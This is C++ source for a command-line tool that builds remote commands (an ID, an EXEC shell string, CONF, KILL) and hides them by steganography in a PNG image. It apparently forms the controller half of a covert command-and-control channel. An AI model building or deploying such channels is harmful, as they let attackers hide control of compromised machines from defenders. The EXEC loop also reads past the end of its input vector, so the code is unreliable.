#include "cli.h"

    void cli::setAttr (cli *cliInstance){
            if(cliInstance->input[1] == "ID"){
                cliInstance->id = cliInstance->input[2];
            }else if(cliInstance->input[1] == "EXEC"){
                //For statement to store entire command in EXEC.
                for (int i = 2; i <= cliInstance->input.size(); i++){
                  cliInstance->Exec += cliInstance->input[i] + " ";
                }
            }else if(cliInstance->input[1] == "CONF"){
                cliInstance->Conf = cliInstance->input[2];
            }else if(cliInstance->input[1]== "KILL"){
                cliInstance->Kill = cliInstance->input[2];
            }else{
                fprintf(stdout,"Error, Invalid command\n");
            }
    }

    void cli::showInfo (cli *cliInstance){
        std::cout <<
            "COMMAND            REQUIRED           VALUE      \n"
            "-------            ------            ------      \n"
            "KILL               NOT REQUIRED        "+ cliInstance->Kill + " \n"
            "CONF               NOT REQUIRED        "+ cliInstance->Conf + " \n"
            "EXEC               NOT REQUIRED        "+ cliInstance->Exec + " \n"
            "ID                 REQUIRED            "+ cliInstance->id +   " \n";
    }
    void cli::runCommand (cli *cliInstance){
         std::string commandParser = "<COM";
            //Validate ID was set
            if(!cliInstance->id.empty()){
                commandParser.append(":");
                commandParser.append(cliInstance->id);
            }else{
                fprintf(stdout,"Error: ID Required\n");
                return;
            }
            if(!cliInstance->Exec.empty()){
                commandParser.append(":4-");
                commandParser.append(cliInstance->Exec);
            }
            if(!cliInstance->Conf.empty()){
                commandParser.append(":1-");
                commandParser.append(cliInstance->Conf);
            }
            if(!cliInstance->Kill.empty()){
                commandParser.append(":");
                commandParser.append("0-0");
            }
            commandParser.append(">");
            std::string dImage = "images/defaultR.png";                  
            std::string wImage = "images/tree.png"; 
            stegImage encodeImage;
            encodeImage.readPNG(&dImage,commandParser);   
            encodeImage.writePNG(&wImage);
    }

    void cli::call_command(cli *cliInstance){
        auto iter = cliInstance->map.find(cliInstance->input[0]);
        //If valid command is found, execute it
        if(iter != cliInstance->map.end()){
            (*iter->second)(cliInstance);
        }
    }
    
    void cli::init(cli *cliInstance){
        //Initialize CLI map of function pointers
        cliInstance->map.emplace("set",&setAttr);
        cliInstance->map.emplace("show",&showInfo);
        cliInstance->map.emplace("run", &runCommand);
  
    }

    int cli::parseCommand(std::string command){
        std::istringstream commandInput(command);
        std::string current;
        while(getline(commandInput,current,' ')){
            this->input.push_back(current);
        }
        //Validate input is not empty
        if(this->input.empty()){
            return -1;
        }
        return 0;
    }
    
    void *cli::cliPerform(void *params){
        cli *cliInt = (cli *)params;

        while(true){
            std::string command;
            //Pull for Input
            std::getline(std::cin,command);
            //Clear Input field each iteration
            cliInt->input.clear();
            //Parse Command for fields
            if(cliInt->parseCommand(command)){
                fprintf(stdout,"Error: Invalid Syntex\n");
                continue;
            }
            cliInt->call_command(cliInt);

        }
   
    }


